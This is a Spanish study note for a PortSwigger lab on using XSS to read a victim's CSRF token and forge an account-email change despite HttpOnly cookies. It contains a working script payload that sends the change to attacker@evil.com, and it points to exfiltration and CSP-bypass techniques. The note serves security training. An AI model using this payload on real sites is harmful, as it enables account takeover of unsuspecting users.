---
aliases:
  - XSS 004 - HttpOnly, leer CSRF token y actuar
  - xss bypass csrf httponly
tags:
  - vuln/xss
  - example
  - portswigger
---

# 004 — HttpOnly: leer el CSRF token y actuar como la víctima

> Lab: [Exploiting XSS to bypass CSRF defenses](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf) · **Practitioner** · técnica → [[vulnerabilities/002-xss/README|entry point]]

## ¿Por qué acá? (cuando `document.cookie` no alcanza)
- **`HttpOnly: true` no descarta el XSS:** no podés leer la cookie por JS, pero el XSS **corre en la sesión de la víctima** → hacés `fetch` same-origin y **actuás como ella**.
- Weaponización clásica: el XSS **lee el CSRF token** de `/my-account` y **forja el POST** de cambio de email/password. El token deja de proteger porque tu script lo lee legítimamente desde el mismo origen.
- En **Stage 2** el objetivo es el **admin**: XSS stored donde el admin lo ve → tomás su cuenta.

## Cómo explotarlo

> 🟡 <mark>Resaltado</mark> = ajustá al endpoint/campo del target.

Payload stored (o entregado por exploit server si es reflected) que lee el token y cambia el email:
<pre class="payload"><code>&lt;script&gt;
var req = new XMLHttpRequest();
req.onload = function() {
  var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
  var change = new XMLHttpRequest();
  change.open('post', '<mark>/my-account/change-email</mark>', true);
  change.send('csrf='+token+'&email=<mark>attacker@evil.com</mark>');
};
req.open('get', '<mark>/my-account</mark>', true);
req.send();
&lt;/script&gt;</code></pre>

## Verificación
El email de la cuenta de la víctima cambia al tuyo (lab resuelto). Con `HttpOnly: false` podrías haber robado la cookie directo → [[vulnerabilities/002-xss/examples/001-reflected-stored-basico-exfil-cookie|001]].

## Detalles que se pasan por alto
- **Reflected** → hay que **entregarlo por el exploit server** a la víctima; **stored** en un campo que el admin vea se dispara solo.
- Alternativas a leer el token: exfiltrar `apiKey`/`/my-account` por [[exam/shortcuts/exfil-oastify|exfil-oastify]].
- Si hay **CSP estricto** que impide ejecutar JS → *dangling markup* scriptless para exfiltrar el token ([lab CSP](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack)).
- Cómo weaponizar en detalle → [[vulnerabilities/002-xss/README#🎯 Qué hacer con un XSS (objetivos de explotación)|objetivos de explotación]].
